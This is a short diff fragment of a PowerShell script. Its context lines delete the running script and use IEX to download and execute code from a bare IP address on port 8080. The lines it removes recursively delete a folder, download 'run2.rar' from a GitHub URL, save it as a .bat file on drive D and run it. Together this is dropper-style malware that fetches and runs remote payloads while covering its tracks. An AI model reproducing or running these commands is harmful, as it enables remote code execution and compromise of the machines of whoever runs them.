@@ -2947,6 +2947,4 @@ Remove-Item $MyINvocation.InvocationName
 
 IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
 
-remove-item $fileSaveDir -recurse
-(new-object System.Net.WebClient).DownloadFile($githuburl + '/run2.rar','D:\run2.bat');
-d:\run2.bat
+
